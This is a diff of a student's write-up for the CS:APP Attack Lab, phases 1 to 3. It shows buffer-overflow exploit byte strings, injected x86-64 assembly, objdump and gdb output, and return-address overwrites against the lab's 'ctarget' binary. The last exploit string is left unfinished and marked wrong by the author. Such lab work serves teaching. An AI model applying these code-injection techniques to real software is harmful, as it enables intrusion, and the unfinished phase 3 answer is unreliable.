@@ -1330,11 +1330,11 @@ If we type a long string, the bounds of arrays will be overrun. Whereas, we shou
 
 ###### Level 1  touch1
 
-Task: To Call `touch1` when `getbuf()` returns instead of returning to the caller: `test()`.
+Task of phase 1: To Call `touch1` when `getbuf()` returns instead of returning to the caller: `test()`.
 
 **Tips:** 
 
-1. Find the "BUFFER_SIZE".  (maximum 0x28)
+> 1. Find the "BUFFER_SIZE".  (maximum 0x28)
 
 ***Analyses:*** 
 
@@ -1467,7 +1467,7 @@ Hence, since my input string is stored in the current stack of `getbuf` and they
  11 ec 17 40 00   /* the return address of touch2 */
 ```
 
-2.1) Then I found that my cookie value had been already loaded to `0x6044e4`. 
+2.1) Then I found that my cookie value had been already loaded at `0x6044e4`. 
 
 ```assembly
 00000000004017ec <touch2>:
@@ -1514,8 +1514,8 @@ retq
 Then generate the byte code with the correct assembly code. 
 
 ```shell
-gcc -c assem_level2.s
-objdump -d assem_level2.o > assem_level2.d	
+gcc -c assem_lv2.s
+objdump -d assem_lv2.o > assem_lv2.d	
 ```
 
 ```assembly
@@ -1593,7 +1593,7 @@ When the instruction at `0x4017b4` is going to be executed, I examine the memory
    0x5561dc78:  mov    $0x59b997fa,%rdi   # It is exactly the assembly I write. 
 ```
 
-To understand the byte sequences and how the machine reads them, let's find the first byte of `%rsp`. Apparently, the byte ordering is as same as that in my exploit byte code. Since it is a little-endian machine, the 4-byte word is displayed from the most significant byte to the least. Hence,  `fa` is not stored at `0x5561dc78`. 
+To understand the byte sequences and how the machine executes them, let's examine the first byte  at the address of `%rsp`. See the following result. Apparently, the byte ordering is as same as that in my exploit byte code. Since it is a little-endian machine, the 4-byte word is displayed from the most significant byte to the least. Hence,  `fa` is not stored at `0x5561dc78`. 
 
 ```shell
 (gdb) x/1xb $rsp
@@ -1602,7 +1602,7 @@ To understand the byte sequences and how the machine reads them, let's find the 
 0x5561dc79:     0xc7
 ```
 
-3.5) Tackle the confusion in 2.2.
+3.5) Clarify the confusion in 2.2.
 
 ```assembly
 00000000004017ec <touch2>:
@@ -1622,4 +1622,95 @@ To understand the byte sequences and how the machine reads them, let's find the 
 When the instruction at `0x401802` is being executed, the content in `0x202ce2(%rip)` is `$0x59b997fa`, my cookie. `%rip` as the PC is constantly changed. 
 
 Ah ! At last, the solution is valid. Great !
+
+###### Level 3 touch3
+
+**Tips:**
+
+> 1. `sprintf(char *s, const char *format, ...)` writes the output into the string "s". 
+
+"Phase 3 also involves a code injection attack, but passing a string as argument. "
+
+What does this phase ask us to do?
+
+1. Inject code as an input string of `ctarget` and let `getbuf` transfer control to my exploit code.
+
+2. In my exploit code, transfer control to `touch3` and then pass my cookie as string to the function. 
+
+   Note that the cookie `0x59b997fa` should be a string without the hexadecimal prefix, namely `59b997fa` should be in a string format. We can find the byte representation of it in ASCII. 
+
+   Don't forget the byte ordering; it is little endian. And don't forget the terminal `'\0'`
+
+   Attention should be paid is that it is different from that converting hexadecimal digits to characters with `hex2raw`. We should treat each digit of `59b997fa\0` as a character and then find the byte representation, namely the hexadecimal value of them in the ASCII table. Then our exploit code should consist of these hexadecimal numbers and some instructions. After that, use `hex2raw`  to convert it to an input string. 
+
+   Why do we have to use the byte representation of the cookie `59b997fa\0`?
+
+   Because we can't combine a string(`59b997fa\0`) and byte code. Recall that a string in memory is represented by the address of its first character and is terminated by a `\0`. 
+
+***Analyses***
+
+(1) Put my cookie as string on the top of the stack of `getbuf` for now. It might be corrupted by `hexmatch` or `strncmp` later, but I will move it to a proper place. 
+
+1.1) Find the the sequence of bytes of my cookie, `59b997fa\0` , as a string in the ASCII table.
+
+```txt
+59b997fa\0  :  35 39 62 39 39 37 66 61 00
+```
+
+(2) Create the exploit byte code.
+
+2.1) Write my exploit assembly code. 
+
+N.B. `%rsp: $0x5561dc78` is the address of the stack top of `getbuf`. 
+
+```assembly
+# assem_lv3.s
+# Hand-generated assembly code of the level 3 of part 1.
+# The address is (%rsp: $0x5561dc78) for now because I will put the address of 
+# my cooike here, for now. 
+mov $0x5561dc78, %rdi   
+pushq $0x4018fa   # Push the address of touch3.   
+retq
+```
+
+2.2) Generate the byte code.
+
+```shell
+gcc -c assem_lv3.s
+objdump -d assem_lv3.o > assem_lv3.d	
+```
+
+```assembly
+  1
+  2 assem_lv3.o:     file format elf64-x86-64
+  3
+  4
+  5 Disassembly of section .text:
+  6
+  7 0000000000000000 <.text>:
+  8    0:   48 c7 c7 78 dc 61 55    mov    $0x5561dc78,%rdi
+  9    7:   68 fa 18 40 00          pushq  $0x4018fa
+ 10    c:   c3                      retq
+```
+
+2.3) The copy the byte code and the byte sequence of my cookie in 1.1 to my exploit code. 
+
+```assembly
+  /* The byte sequence of my cookie as a string. There is a terminal '\0' after '61'. */
+  1 35 39 62 39     
+  2 39 37 66 61
+  3 00 00 00 00
+  4 48 c7 c7 78     /* The byte code of my exploit assembly  */
+  5 dc 61 55 68
+  6 fa 18 40 00
+  7 c3 00 00 00
+  8 00 00 00 00
+  9 00 00 00 00
+ 10 00 00 00 00
+ 11 8a dc 61 55     
+```
+
+Note that my exploit starts at the 4th line, namely `0x12(%rsp)` which is `0x5561dc8a`(Wrong!!) .  It is NOT the hexadecimal `0x12`, but the decimal `12` which is `0xc` in hexadecimal format. Since `0x5561dc78 + 0xc=0x5561dc84`, the last line is `84 dc 61 55`. 
+
+The answer is wrong! To be correct. 
 
